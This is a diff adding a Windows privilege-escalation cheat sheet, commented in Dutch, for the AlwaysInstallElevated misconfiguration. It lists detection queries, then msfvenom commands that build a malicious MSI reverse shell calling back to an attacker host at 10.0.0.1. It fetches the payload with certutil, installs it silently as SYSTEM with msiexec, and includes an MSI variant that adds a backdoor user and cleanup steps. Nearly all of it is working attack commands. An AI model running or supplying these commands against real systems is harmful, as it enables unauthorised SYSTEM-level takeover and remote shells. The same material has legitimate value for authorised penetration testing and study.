@@ -1,0 +1,22 @@
+# AlwaysInstallElevated - MSI installer als SYSTEM
+# Vereiste: Beide registry keys moeten op 1 staan
+# === Detectie ===
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Of via PowerUp:
+powershell -c "Import-Module .\PowerUp.ps1; Get-RegistryAlwaysInstallElevated"
+# === Exploit: MSI reverse shell ===
+# Op aanvaller - genereer malicious MSI:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi -o evil.msi
+# Upload naar target:
+certutil -urlcache -f http://10.0.0.1/evil.msi C:\Windows\tasks\evil.msi
+# Installeer (draait als SYSTEM):
+msiexec /quiet /qn /i C:\Windows\tasks\evil.msi
+# === Exploit: User toevoegen via MSI ===
+# msfvenom -p windows/adduser USER=hacker PASS=Hacked123! -f msi -o adduser.msi
+# msiexec /quiet /qn /i adduser.msi
+# === Opruimen ===
+msiexec /quiet /qn /x C:\Windows\tasks\evil.msi
+del C:\Windows\tasks\evil.msi
+# Tip: /quiet /qn = geen UI, stille installatie
+# Tip: Wordt gevonden door PowerUp Invoke-AllChecks
